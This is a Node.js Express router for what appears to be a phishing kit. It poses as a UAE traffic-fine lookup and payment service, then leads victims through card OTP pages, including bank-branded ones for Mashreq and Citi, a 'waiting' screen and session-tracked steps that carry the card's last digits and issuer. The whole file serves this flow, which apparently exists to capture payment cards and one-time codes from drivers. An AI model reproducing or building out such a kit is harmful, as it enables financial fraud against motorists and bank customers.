const express = require('express');
const router  = express.Router();

const EMIRATE_NAMES = {
  DXB:'Dubai', AUH:'Abu Dhabi', SHJ:'Sharjah',
  AJM:'Ajman', UAQ:'Umm Al Quwain', RAK:'Ras Al Khaimah', FUJ:'Fujairah',
};

router.get('/', (req, res) => res.render('index'));

router.get('/fines', (req, res) => {
  const { plateNo='', plateCat='2', plateSrcCode='DXB', plateCodeId='0', plateCodeLetter='' } = req.query;
  res.render('fines', {
    plateNo, plateCat, plateSrcCode, plateCodeId, plateCodeLetter,
    emirateName: EMIRATE_NAMES[plateSrcCode] || plateSrcCode,
  });
});

router.get('/payment', (req, res) => {
  const { plateNo='', plateSrcCode='', plateCodeLetter='', totalFine='0', fineCount='0' } = req.query;
  res.render('payment', {
    plateNo, plateSrcCode, plateCodeLetter,
    totalFine:  parseInt(totalFine)  || 0,
    fineCount:  parseInt(fineCount)  || 0,
    emirateName: EMIRATE_NAMES[plateSrcCode] || plateSrcCode,
  });
});

router.get('/otp-loading', (req, res) => {
  const { amount='0', cardLast4='****', totalFine, issuer='', sid='' } = req.query;
  res.render('otp-loading', {
    amount: parseInt(amount) || 0,
    cardLast4,
    totalFine: parseInt(totalFine || amount) || 0,
    issuer,
    sid,
  });
});

router.get('/otp-sms', (req, res) => {
  const { amount='0', cardLast4='****', totalFine, issuer='Your Bank', sid='' } = req.query;
  res.render('otp-sms', {
    amount: parseInt(amount) || 0,
    cardLast4,
    totalFine: parseInt(totalFine || amount) || 0,
    issuer,
    sid,
    dateStr: new Date().toLocaleDateString('tr-TR', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric' }),
  });
});

router.get('/otp', (req, res) => {
  const { amount='0', cardLast4='****', totalFine, issuer='', sid='' } = req.query;
  res.render('otp', {
    cardLast4,
    totalFine: parseInt(totalFine || amount) || 0,
    issuer,
    sid,
    dateStr: new Date().toLocaleDateString('tr-TR', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric' }),
  });
});

router.get('/waiting', (req, res) => {
  const { cardLast4='****', totalFine='0', issuer='', sid='' } = req.query;
  res.render('waiting', {
    cardLast4,
    totalFine: parseInt(totalFine) || 0,
    issuer,
    sid,
  });
});

router.get('/otp-mashreq', (req, res) => {
  const { totalFine='0', cardLast4='****', issuer='Mashreq', sid='' } = req.query;
  res.render('otp-mashreq', { totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
});

router.get('/otp-citi', (req, res) => {
  const { totalFine='0', cardLast4='****', issuer='Citi', sid='' } = req.query;
  res.render('otp-citi', { totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
});

module.exports = router;
